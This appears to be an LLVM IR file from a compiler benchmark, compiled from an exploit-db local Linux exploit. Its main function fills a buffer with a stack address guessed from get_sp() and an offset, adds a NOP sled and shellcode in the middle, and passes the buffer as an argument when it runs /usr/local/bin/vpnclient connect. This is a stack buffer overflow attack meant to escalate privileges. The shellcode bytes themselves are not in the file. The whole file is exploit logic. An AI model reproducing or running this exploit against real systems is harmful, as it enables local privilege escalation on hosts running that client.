; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_21568.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_21568.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@LEN = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [24 x i8] c"addr: 0x%x, offset: %d\0A\00", align 1
@NOP = common dso_local global i8 0, align 1
@shell = common dso_local global i32* null, align 8
@.str.1 = private unnamed_addr constant [25 x i8] c"/usr/local/bin/vpnclient\00", align 1
@.str.2 = private unnamed_addr constant [10 x i8] c"vpnclient\00", align 1
@.str.3 = private unnamed_addr constant [8 x i8] c"connect\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %7, align 4
  %11 = load i32, i32* %4, align 4
  %12 = icmp sgt i32 %11, 1
  br i1 %12, label %13, label %18

13:                                               ; preds = %2
  %14 = load i8**, i8*** %5, align 8
  %15 = getelementptr inbounds i8*, i8** %14, i64 1
  %16 = load i8*, i8** %15, align 8
  %17 = call i32 @atoi(i8* %16)
  store i32 %17, i32* %7, align 4
  br label %18

18:                                               ; preds = %13, %2
  %19 = load i32, i32* @LEN, align 4
  %20 = sext i32 %19 to i64
  %21 = mul i64 1, %20
  %22 = trunc i64 %21 to i32
  %23 = call i64 @malloc(i32 %22)
  %24 = inttoptr i64 %23 to i8*
  store i8* %24, i8** %9, align 8
  %25 = load i8*, i8** %9, align 8
  %26 = load i32, i32* @LEN, align 4
  %27 = call i32 @bzero(i8* %25, i32 %26)
  %28 = call i32 (...) @get_sp()
  %29 = load i32, i32* %7, align 4
  %30 = sub nsw i32 %28, %29
  %31 = sext i32 %30 to i64
  store i64 %31, i64* %8, align 8
  %32 = load i64, i64* %8, align 8
  %33 = load i32, i32* %7, align 4
  %34 = call i32 @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str, i64 0, i64 0), i64 %32, i32 %33)
  store i32 0, i32* %6, align 4
  br label %35

35:                                               ; preds = %46, %18
  %36 = load i32, i32* %6, align 4
  %37 = load i32, i32* @LEN, align 4
  %38 = icmp slt i32 %36, %37
  br i1 %38, label %39, label %49

39:                                               ; preds = %35
  %40 = load i64, i64* %8, align 8
  %41 = load i8*, i8** %9, align 8
  %42 = load i32, i32* %6, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds i8, i8* %41, i64 %43
  %45 = bitcast i8* %44 to i64*
  store i64 %40, i64* %45, align 8
  br label %46

46:                                               ; preds = %39
  %47 = load i32, i32* %6, align 4
  %48 = add nsw i32 %47, 4
  store i32 %48, i32* %6, align 4
  br label %35

49:                                               ; preds = %35
  store i32 0, i32* %6, align 4
  br label %50

50:                                               ; preds = %61, %49
  %51 = load i32, i32* %6, align 4
  %52 = load i32, i32* @LEN, align 4
  %53 = sdiv i32 %52, 2
  %54 = icmp slt i32 %51, %53
  br i1 %54, label %55, label %64

55:                                               ; preds = %50
  %56 = load i8, i8* @NOP, align 1
  %57 = load i8*, i8** %9, align 8
  %58 = load i32, i32* %6, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds i8, i8* %57, i64 %59
  store i8 %56, i8* %60, align 1
  br label %61

61:                                               ; preds = %55
  %62 = load i32, i32* %6, align 4
  %63 = add nsw i32 %62, 1
  store i32 %63, i32* %6, align 4
  br label %50

64:                                               ; preds = %50
  %65 = load i8*, i8** %9, align 8
  %66 = load i32, i32* @LEN, align 4
  %67 = sdiv i32 %66, 2
  %68 = load i32*, i32** @shell, align 8
  %69 = call i32 @strlen(i32* %68)
  %70 = sdiv i32 %69, 2
  %71 = sub nsw i32 %67, %70
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds i8, i8* %65, i64 %72
  store i8* %73, i8** %10, align 8
  store i32 0, i32* %6, align 4
  br label %74

74:                                               ; preds = %88, %64
  %75 = load i32, i32* %6, align 4
  %76 = load i32*, i32** @shell, align 8
  %77 = call i32 @strlen(i32* %76)
  %78 = icmp slt i32 %75, %77
  br i1 %78, label %79, label %91

79:                                               ; preds = %74
  %80 = load i32*, i32** @shell, align 8
  %81 = load i32, i32* %6, align 4
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds i32, i32* %80, i64 %82
  %84 = load i32, i32* %83, align 4
  %85 = trunc i32 %84 to i8
  %86 = load i8*, i8** %10, align 8
  %87 = getelementptr inbounds i8, i8* %86, i32 1
  store i8* %87, i8** %10, align 8
  store i8 %85, i8* %86, align 1
  br label %88

88:                                               ; preds = %79
  %89 = load i32, i32* %6, align 4
  %90 = add nsw i32 %89, 1
  store i32 %90, i32* %6, align 4
  br label %74

91:                                               ; preds = %74
  %92 = load i8*, i8** %9, align 8
  %93 = load i32, i32* @LEN, align 4
  %94 = sub nsw i32 %93, 1
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds i8, i8* %92, i64 %95
  store i8 0, i8* %96, align 1
  %97 = load i8*, i8** %9, align 8
  %98 = call i32 @execl(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.1, i64 0, i64 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.3, i64 0, i64 0), i8* %97, i32 0)
  ret i32 0
}

declare dso_local i32 @atoi(i8*) #1

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @bzero(i8*, i32) #1

declare dso_local i32 @get_sp(...) #1

declare dso_local i32 @printf(i8*, i64, i32) #1

declare dso_local i32 @strlen(i32*) #1

declare dso_local i32 @execl(i8*, i8*, i8*, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
